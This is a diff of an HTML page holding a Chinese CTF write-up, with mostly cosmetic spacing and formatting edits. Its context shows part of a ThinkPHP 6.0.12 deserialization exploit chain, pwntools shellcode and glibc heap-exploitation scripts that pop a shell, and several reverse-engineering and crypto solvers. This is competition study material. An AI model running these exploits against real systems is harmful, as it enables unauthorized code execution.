@@ -135,7 +135,7 @@
     <section class="article-content">
     <h2 id="web">Web</h2>
 <h3 id="ezpop">ezpop</h3>
-<p>tp6.0.12的反序列化洞，直接用现成的链的打就行</p>
+<p>tp6.0.12 的反序列化洞，直接用现成的链的打就行</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think</span>{
     <span style="color:#66d9ef">abstract</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Model</span>{
@@ -168,7 +168,7 @@
 }
 </code></pre></div><h2 id="pwn">Pwn</h2>
 <h2 id="login-nomal">login-nomal</h2>
-<p>可见字符shellcode，调用ae64脚本，rdx直接打通</p>
+<p>可见字符 shellcode，调用 ae64 脚本，rdx 直接打通</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> ae64 <span style="color:#f92672">import</span> AE64
 <span style="color:#f92672">import</span> sys
@@ -230,7 +230,7 @@ weak(enc_shellcode<span style="color:#f92672">.</span>decode(<span style="color:
 
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><h3 id="newest_note">newest_note</h3>
-<p>2.34版本，整数溢出+uaf，先leak tcache的key，然后伪造堆块拿libc和environ最后再伪造一个栈上的chunk到返回地址拿到shell</p>
+<p>2.34 版本，整数溢出 +uaf，先 leak tcache 的 key，然后伪造堆块拿 libc 和 environ 最后再伪造一个栈上的 chunk 到返回地址拿到 shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> sys
 context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
@@ -342,7 +342,6 @@ show(<span style="color:#ae81ff">2</span>)
 stack2<span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
 print(<span style="color:#e6db74">&#34;stack_info2: &#34;</span> <span style="color:#f92672">+</span> hex(stack2))
 
-
 ret2 <span style="color:#f92672">=</span> stack2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x158</span>
 flip(<span style="color:#ae81ff">1</span>)
 flip(<span style="color:#ae81ff">0</span>)
@@ -362,7 +361,7 @@ add(<span style="color:#ae81ff">4</span>,payload)
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><h2 id="re">Re</h2>
 <h3 id="baby_tree">baby_tree</h3>
-<p>手撸ast，还原到swift源码</p>
+<p>手撸 ast，还原到 swift 源码</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-swift" data-lang="swift"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">check</span>(encoded:String, keyValue:String) -&gt; (Bool){
     <span style="color:#66d9ef">var</span> b = [UInt8](encoded.utf8)
     <span style="color:#66d9ef">var</span> k = [UInt8](keyValue.utf8)
@@ -377,8 +376,10 @@ p<span style="color:#f92672">.</span>interactive()
     }
     <span style="color:#66d9ef">return</span> b == [<span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">16</span>]
 }
-</code></pre></div><p>用z3求解</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">enc <span style="color:#f92672">=</span> [
+</code></pre></div><p>用 z3 求解</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+enc <span style="color:#f92672">=</span> [
     <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">64</span>,
     <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">205</span>,
     <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">16</span>
@@ -386,12 +387,8 @@ p<span style="color:#f92672">.</span>interactive()
 
 k <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x79</span>]
 
-
-<span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-
 s <span style="color:#f92672">=</span> Solver()
 flag <span style="color:#f92672">=</span> [BitVec(<span style="color:#e6db74">&#39;flag</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> i, <span style="color:#ae81ff">16</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc))]
-
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(flag) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>):
     r0, r1, r2, r3 <span style="color:#f92672">=</span> flag[i], flag[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], flag[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>], flag[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>]
@@ -401,17 +398,15 @@ flag <span style="color:#f92672">=</span> [BitVec(<span style="color:#e6db74">&#
     flag[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> r1 <span style="color:#f92672">^</span> k[<span style="color:#ae81ff">3</span>]
     (k[<span style="color:#ae81ff">0</span>], k[<span style="color:#ae81ff">1</span>], k[<span style="color:#ae81ff">2</span>], k[<span style="color:#ae81ff">3</span>]) <span style="color:#f92672">=</span> (k[<span style="color:#ae81ff">1</span>], k[<span style="color:#ae81ff">2</span>], k[<span style="color:#ae81ff">3</span>], k[<span style="color:#ae81ff">0</span>])
 
-
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc)):
     s<span style="color:#f92672">.</span>add(enc[i] <span style="color:#f92672">==</span> flag[i])
-
 
 <span style="color:#66d9ef">if</span> s<span style="color:#f92672">.</span>check() <span style="color:#f92672">==</span> sat:
     print (s<span style="color:#f92672">.</span>model())
 <span style="color:#66d9ef">else</span>:
     print (<span style="color:#e6db74">&#34;no res&#34;</span>)
 </code></pre></div><h3 id="babycode">babycode</h3>
-<p>mruby字节码，参考文档：https://github.com/mruby/mruby/blob/c6c789d2e84085831351740684b72f9a5086cd2d/include/mruby/ops.h</p>
+<p>mruby 字节码，参考文档：https://github.com/mruby/mruby/blob/c6c789d2e84085831351740684b72f9a5086cd2d/include/mruby/ops.h</p>
 <p>手撸还原源码</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Crypt</span>
     <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CIPHER</span>
@@ -482,7 +477,7 @@ p <span style="color:#f92672">=</span> gets<span style="color:#f92672">.</span>c
 <span style="color:#66d9ef">if</span> check(p)
     puts <span style="color:#e6db74">&#34;yes&#34;</span>
 <span style="color:#66d9ef">end</span>
-</code></pre></div><p>修改后的xtea，解密脚本：</p>
+</code></pre></div><p>修改后的 xtea，解密脚本：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;  </span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;  </span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
@@ -506,10 +501,10 @@ p <span style="color:#f92672">=</span> gets<span style="color:#f92672">.</span>c
     decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k);
     decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>, k);
     decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, k);
-    printf(<span style="color:#e6db74">&#34;%x %x %x %x %x %x %x %x %x %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v[<span style="color:#ae81ff">0</span>],v[<span style="color:#ae81ff">1</span>], v[<span style="color:#ae81ff">2</span>], v[<span style="color:#ae81ff">3</span>], v[<span style="color:#ae81ff">4</span>], v[<span style="color:#ae81ff">5</span>], v[<span style="color:#ae81ff">6</span>], v[<span style="color:#ae81ff">7</span>], v[<span style="color:#ae81ff">8</span>], v[<span style="color:#ae81ff">9</span>]);  
+    printf(<span style="color:#e6db74">&#34;%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v[<span style="color:#ae81ff">0</span>],v[<span style="color:#ae81ff">1</span>], v[<span style="color:#ae81ff">2</span>], v[<span style="color:#ae81ff">3</span>], v[<span style="color:#ae81ff">4</span>], v[<span style="color:#ae81ff">5</span>], v[<span style="color:#ae81ff">6</span>], v[<span style="color:#ae81ff">7</span>], v[<span style="color:#ae81ff">8</span>], v[<span style="color:#ae81ff">9</span>]);  
     <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
-</code></pre></div><p>最后一个异或使用python求解</p>
+</code></pre></div><p>最后一个异或使用 python 求解</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">a <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x0e</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x65</span>]
 
 lst_ch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
@@ -517,11 +512,11 @@ lst_ch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
     lst_ch <span style="color:#f92672">=</span> a[i] <span style="color:#f92672">^</span> lst_ch <span style="color:#f92672">^</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
     print (chr(lst_ch), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
 </code></pre></div><h3 id="secreeeeet">secreeeeet</h3>
-<p>rabbit加密</p>
-<p>key前5字节随机生成，后面11字节根据前面5字节生成</p>
-<p>最后用3个随机字节异或</p>
-<p>已知flag.png的文件头，可以爆破得到key</p>
-<p>直接用网上的Rabbit库解密</p>
+<p>rabbit 加密</p>
+<p>key 前 5 字节随机生成，后面 11 字节根据前面 5 字节生成</p>
+<p>最后用 3 个随机字节异或</p>
+<p>已知 flag.png 的文件头，可以爆破得到 key</p>
+<p>直接用网上的 Rabbit 库解密</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> hashlib
 <span style="color:#f92672">from</span> Rabbit <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
@@ -558,7 +553,7 @@ s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;qscfthnj
                                                 print(ans)
 </code></pre></div><h2 id="crypto">Crypto</h2>
 <h3 id="签到电台">签到电台</h3>
-<p>首先发送一个s开启电报，抓包可以看到返回一个session，再随意发一个字符发现session添加到了cookie字段中，之后直接发送电码本和掩码的模10加结果即可，注意中间是用J分隔的，脚本如下</p>
+<p>首先发送一个 s 开启电报，抓包可以看到返回一个 session，再随意发一个字符发现 session 添加到了 cookie 字段中，之后直接发送电码本和掩码的模 10 加结果即可，注意中间是用 J 分隔的，脚本如下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">plaint <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1732251413440356045166710055&#39;</span>
 mask   <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1021723964055826996370726447&#39;</span>
 msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
@@ -570,25 +565,25 @@ msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;<
                 print(<span style="color:#e6db74">&#39;J&#39;</span>)
         print(msg[i], end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
 </code></pre></div><h3 id="基于挑战码的双向认证123">基于挑战码的双向认证123</h3>
-<p>学着server的代码填空即可，主要填两个地方，填完发现仨题都能打通</p>
-<p>在152行处</p>
+<p>学着 server 的代码填空即可，主要填两个地方，填完发现仨题都能打通</p>
+<p>在 152 行处</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    Memset(Buf,<span style="color:#ae81ff">0</span>,DIGEST_SIZE<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>);
     Strncpy(Buf,client_state<span style="color:#f92672">-&gt;</span>key,DIGEST_SIZE);
     Memcpy(Buf<span style="color:#f92672">+</span>DIGEST_SIZE,client_state<span style="color:#f92672">-&gt;</span>nonceA,DIGEST_SIZE);
     Memcpy(Buf<span style="color:#f92672">+</span>DIGEST_SIZE<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,client_state<span style="color:#f92672">-&gt;</span>nonceB,DIGEST_SIZE);
     calculate_context_sm3(Buf,DIGEST_SIZE<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>,Buf<span style="color:#f92672">+</span>DIGEST_SIZE<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>);
-</code></pre></div><p>在184行处</p>
+</code></pre></div><p>在 184 行处</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    Memset(Buf,<span style="color:#ae81ff">0</span>,DIGEST_SIZE<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>);
     Strncpy(Buf,client_state<span style="color:#f92672">-&gt;</span>key,DIGEST_SIZE);
     Memcpy(Buf<span style="color:#f92672">+</span>DIGEST_SIZE,client_state<span style="color:#f92672">-&gt;</span>nonceB,DIGEST_SIZE);
     calculate_context_sm3(Buf,DIGEST_SIZE<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,login_info<span style="color:#f92672">-&gt;</span>passwd);
 </code></pre></div><h3 id="iso9798">ISO9798</h3>
-<p>随意发送16字节后拿到E(r_A||r_B||B)，试了几次发现用的是分组加密的ECB模式，直接发送给服务端E(r_B)||E(r_A)即可</p>
+<p>随意发送 16 字节后拿到 <code>E(r_A||r_B||B)</code>，试了几次发现用的是分组加密的 ECB 模式，直接发送给服务端 <code>E(r_B)||E(r_A)</code> 即可</p>
 <h2 id="misc">Misc</h2>
 <h3 id="问卷">问卷</h3>
-<p>填问卷，拿flag</p>
+<p>填问卷，拿 flag</p>
 <h3 id="ez_usb">ez_usb</h3>
-<p>两个键盘的流量，一个是rar，一个是密码，抓出流量解密拿到flag</p>
+<p>两个键盘的流量，一个是 rar，一个是密码，抓出流量解密拿到 flag</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
 <span style="color:#f92672">import</span> os
 
